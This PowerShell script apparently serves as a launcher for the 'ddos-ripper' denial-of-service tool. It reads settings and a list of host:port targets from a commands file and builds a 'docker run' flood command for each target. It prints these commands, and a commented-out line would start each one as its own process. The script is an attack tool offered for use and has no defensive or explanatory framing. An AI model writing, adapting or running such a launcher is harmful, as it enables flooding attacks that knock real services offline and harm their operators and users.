$regex = "#.*";
$FileName = ".\commands\ddos-ripper_commands.txt"

$NumberOfParameters = 2;

$Requests = Get-Content $FileName | Where-Object {-not ($_ -match $regex)} | Select-Object -First 1;
$Turbo = Get-Content $FileName | Where-Object {-not ($_ -match $regex)} | Select-Object -Skip 1  | Select-Object -First 1;

$Part1 = "docker run --rm -it nitupkcuf/ddos-ripper ";
$Part2 = " -p ";
$Part3 = " -t " + $Turbo + " -q " + $Requests;

Get-Content $FileName | Where-Object {-not ($_ -match $regex)} | Select-Object -Skip $NumberOfParameters | ForEach-Object {
	$Target = $_.replace(' ', '').Split(':');
	Write-Host ($Part1 + $Target[0] + $Part2 + $Target[1] + $Part3);
	# Start-Process powershell ($Part1 + $Target[0] + $Part2 + $Target[1] + $Part3);
}
